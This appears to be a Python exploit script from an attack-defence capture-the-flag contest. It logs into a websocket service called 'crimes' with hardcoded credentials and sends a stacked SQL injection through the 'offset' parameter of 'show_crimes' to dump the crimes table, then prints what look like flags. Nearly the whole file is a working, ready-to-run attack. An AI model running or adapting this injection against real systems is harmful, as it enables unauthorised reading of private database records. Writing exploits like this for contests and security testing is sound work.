#!/usr/bin/env python3
# coding=utf-8
from json import dumps, loads
from random import randrange

from socket import gaierror
from sys import stderr, argv
from websocket import create_connection

__author__ = 'm_messiah'

def close(s):
    print(s, file=stderr)
    exit(1)

class Client(object):
    def __init__(self, sock, username, password):
        self.username = username
        self.password = password
        self.ws = sock
        self.sploit = [self.sploit_sql, ]

    def register(self):
        """Registration"""
        self.ws.send(dumps(
            {'action': 'register',
             'params': {'user': self.username, 'password': self.password}}))
        answer = loads(self.ws.recv())
        if "successful" not in answer["text"]:
            close("registration failed: %s" % answer)
        return answer

    def auth(self):
        """Authentication"""
        self.ws.send(dumps(
            {'action': 'auth',
             'params': {'user': self.username, 'password': self.password}}))
        answer = loads(self.ws.recv())
        if "Welcome" not in answer["text"]:
            close("authentication failed: %s" % answer)

        if "text" not in answer and "Welcome" not in answer["text"]:
            if "id" not in answer:
                close("authentication failed: %s" % answer)
            else:
                _ = self.ws.recv()
        if "rows" not in answer:
            answer = loads(self.ws.recv())
        # Show Profiles"""
        if ("data" not in answer["rows"][0] or
                len(answer["rows"][0]["data"]) < 5):
            close("showProfile failed: %s" % answer)
        return answer

    def sploit_sql(self):
        self.ws.send(dumps(
            {'action': 'show_crimes',
             'params': {'offset': "0; select crimeid, name, description, "
                                  "city, country, crimedate, public "
                                  "from crimes --"}}))
        answer = loads(self.ws.recv())
        if ("rows" in answer and
                "data" in answer['rows'][0]):
            crimes = answer['rows'][0]['data']
            print(len(crimes))
            for crime in crimes:
                print(crime['article'].split()[-1])
        else:
            print(answer, file=stderr)


if __name__ == '__main__':
    answer = ""
    if len(argv) < 3:
        close("Usage: %s <sploit_num> <address>\n"
              "where <sploit_num>:\n"
              "0 - sql injection in show_crimes\n"
              "" % argv[0])
    try:
        ws = create_connection("ws://%s:1984/websocket" % argv[2])
        ws.send(dumps({"action": "hello"}))
        answer = loads(ws.recv())
        if answer['rows'][0]['view'] != "form":
            raise KeyError
        #c = Client(ws, '%x' % randrange(16**15), '%x' % randrange(16**15))
        c = Client(ws, "user1", 'qwerty')
        #c.register()
        c.auth()
        # Magic
        c.sploit[int(argv[1])]()

    except gaierror:
        close("No connection to %s" % argv[1])
    except (KeyError, IndexError):
        close("JSON structure\nBad answer in %s" % answer)
    finally:
        try:
            ws.close()
        except:
            pass